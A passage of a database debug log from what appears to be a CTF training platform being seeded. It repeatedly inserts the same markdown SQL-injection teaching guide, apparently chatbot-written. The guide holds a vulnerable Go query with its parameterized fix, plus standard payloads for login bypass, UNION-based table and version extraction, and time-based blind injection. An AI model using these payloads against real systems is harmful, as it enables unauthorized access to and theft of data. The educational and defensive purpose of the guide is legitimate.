**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,89) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.514ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[6.402ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.424','2025-06-09 14:07:55.424',NULL,'cyber security and wbhah','WPAMYiyQfJCKWYEbQtlfnQAnJgxUtCIzzDgnSfGsbmhoBuIQVWkEckrgVLvVJlEJRlPYAVUjrCzZcSMjqMPDOLNRIaGLdReInlHW',100,2) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.462ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.537ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 90 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[8.844ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:55.431','2025-06-09 14:07:55.431',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,90) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.622ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[6.930ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.44','2025-06-09 14:07:55.44',NULL,'cyber security and yslbq','pJrXwZLgSGfgPMCeBzakaAZbbhhDwUjIJnGFabkBzHoFUNRcFTXVitNZwWrsDAgWrQfCrCekbqDbvAcaMOFUVQDdZHepJLXrONFC',100,2) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.612ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.570ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 91 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[7.782ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:55.447','2025-06-09 14:07:55.447',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,91) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.480ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[8.340ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.455','2025-06-09 14:07:55.455',NULL,'cyber security and ryhra','BwIvQolJXEKTlzUrYWZvRutAjFJFwjbsAPWRSFLIyEHhflRFtkoKdKnHoRyfNceTRFjYSIXzxtZNYLqRCUHBwgmhkUgQzRQMsDyA',100,2) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.517ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.509ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 92 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[13.676ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:55.468','2025-06-09 14:07:55.468',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
| **Broken Auth**  | Bypass login using `'' OR ''1''=''1`               | Log in without password       |

---

## 📚 Real-World Examples

* **2017**: Equifax breach – SQLi led to theft of data from 147M users.
* **2020**: Microsoft subdomain bug – SQLi found in legacy endpoint.
* **Bug Bounty Programs**: SQLi is still one of the most reported and rewarded bugs.

---

## 🧠 Final Tip

In a CTF, always look for places where input is directly reflected in results or errors. SQLi is often the key to unlocking hidden admin functions, dumping tables, or pivoting to deeper vulnerabilities.

---

```

Would you like me to do a similar **deep-dive write-up** for **XSS**, **LFI**, or **Command Injection** as well?
```
',2,92) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[6.840ms] [34;1m[rows:1][0m SELECT * FROM "difficulty_levels" WHERE "difficulty_levels"."id" = 2 AND "difficulty_levels"."deleted_at" IS NULL ORDER BY "difficulty_levels"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseMachineModel.go:72
[0m[33m[13.539ms] [34;1m[rows:1][0m INSERT INTO "course_machines" ("created_at","updated_at","deleted_at","title","description","point","difficulty_level_id") VALUES ('2025-06-09 14:07:55.484','2025-06-09 14:07:55.484',NULL,'cyber security and cfwxj','puNEQAyjdcPwsvkoPbGFNsemJSHAvDDZhWnNMnOJGVuUCjiiktFXhoStwHDwwYYqXgdMOHWUEgJLKNFoCQjCpijFDmlyKXqqApjQ',100,2) RETURNING "id"

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.480ms] [34;1m[rows:1][0m SELECT * FROM "rooms" WHERE "rooms"."id" = 2 AND "rooms"."deleted_at" IS NULL ORDER BY "rooms"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/validatorModel.go:47
[0m[33m[0.486ms] [34;1m[rows:1][0m SELECT * FROM "course_machines" WHERE "course_machines"."id" = 93 AND "course_machines"."deleted_at" IS NULL ORDER BY "course_machines"."id" LIMIT 1

2025/06/09 14:07:55 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/CourseModel.go:31
[0m[33m[7.464ms] [34;1m[rows:1][0m INSERT INTO "courses" ("created_at","updated_at","deleted_at","content","room_id","course_machine_id") VALUES ('2025-06-09 14:07:55.491','2025-06-09 14:07:55.491',NULL,'# 🛡️ SQL Injection (SQLi) – CTF Exploitation Guide

## 📘 Overview

**SQL Injection (SQLi)** is one of the most prevalent and dangerous vulnerabilities in web applications. It allows attackers to execute arbitrary SQL code on a database by injecting malicious SQL statements through unsanitized user input. If exploited successfully, SQLi can lead to:

- Authentication bypass
- Data exfiltration
- Data modification or deletion
- Complete database takeover

SQLi vulnerabilities occur when input from a client (user, API consumer, etc.) is concatenated directly into a SQL query without adequate escaping or use of parameterized statements.

---

## 💡 How It Works

Consider this vulnerable login form:

```sql
SELECT * FROM users WHERE username = ''admin'' AND password = ''1234'';
````

If an attacker inputs:

* `Username`: `admin'' --`
* `Password`: `anything`

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = ''admin'' --'' AND password = ''anything'';
```

The `--` comments out the rest of the query, bypassing the password check.

---

## ⚙️ Vulnerable Example in Go (GORM)

### 🚨 Insecure Code

```go
// WARNING: vulnerable to SQL injection!
db.Raw("SELECT * FROM users WHERE username = ''" + username + "'' AND password = ''" + password + "''").Scan(&user)
```

### ✅ Secure Code

```go
// SAFE: uses parameterized query
db.Raw("SELECT * FROM users WHERE username = ? AND password = ?", username, password).Scan(&user)
```

Even better, use GORM''s built-in query methods:

```go
db.Where("username = ? AND password = ?", username, password).First(&user)
```

---

## 🧪 CTF Challenge Hints

**Target Areas**:

* Login forms
* Search fields
* URL query parameters (e.g., `?id=`)
* Admin panels or dashboards
* Any feature that filters or returns database results

**Payload Examples**:

| Goal                       | Payload                                                            |
| -------------------------- | ------------------------------------------------------------------ |
| Auth Bypass                | `'' OR ''1''=''1`                                                      |
| Extract Table Info         | `'' UNION SELECT null, table_name FROM information_schema.tables--` |
| Time-based Blind Injection | `'' OR pg_sleep(5)--`                                               |
| Boolean-based Blind SQLi   | `'' AND 1=1--` or `'' AND 1=2--`                                     |
| Data Extraction via UNION  | `'' UNION SELECT null, version()--`                                 |
| Comment Injection          | `'';--` or `--`                                                     |

---

## 🔍 Manual Testing Strategy

1. **Map Attack Surface**: Locate all endpoints accepting input.

   * URLs with `?id=123`
   * Forms with username/password, search, filters

2. **Inject Basic Payloads**:

   * Start with `''`, `"`, or `--` to cause errors or logic changes
   * Observe for changes in application behavior or server errors

3. **Try Logical Operators**:

   * `'' OR 1=1--`
   * `'' AND 1=2--`

4. **Try UNION SELECT Payloads**:

   * Determine column count (e.g., `'' UNION SELECT null, null--`)
   * Use version extraction: `'' UNION SELECT null, version()--`

5. **Blind Injection (if no error feedback)**:

   * `'' AND (SELECT 1 WHERE 1=1)--`
   * `'' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--`

---

## 🛡️ Prevention Techniques

### ✅ Use Parameterized Queries

Always use prepared statements or parameterized queries to separate logic from data.

**In Go (GORM)**:

```go
db.Where("email = ?", inputEmail).Find(&user)
```

### ✅ Input Validation

* Accept only expected formats (e.g., email regex for login)
* Whitelist acceptable input values when possible

### ✅ Limit DB Permissions

* Use a limited-privilege DB user for the application
* Avoid granting `DROP`, `ALTER`, or `SUPERUSER` access to app-level accounts

### ✅ Logging & Monitoring

* Log unexpected input or failed queries
* Monitor for patterns of enumeration or timed responses

### ✅ Web Application Firewall (WAF)

Use WAFs (e.g., ModSecurity) to detect common SQLi payloads.

---

## 🧰 Tools for SQLi Testing

* [sqlmap](https://sqlmap.org/) – Automated SQLi scanner and exploit tool
* Burp Suite – Manual interception and fuzzing
* OWASP ZAP – Open source proxy for scanning
* Postman or curl – For testing APIs manually

---

## 🎯 CTF Challenge Ideas (You Can Include)

| Challenge Name   | Description                                    | Goal                          |
| ---------------- | ---------------------------------------------- | ----------------------------- |
| **Blind Gate**   | Login page with blind SQLi vulnerability       | Extract admin password        |
| **Query Sniper** | Profile page vulnerable to union-based SQLi    | Dump user table               |
| **Sleep Agent**  | Endpoint reveals data via time-based injection | Detect and exploit time delay |
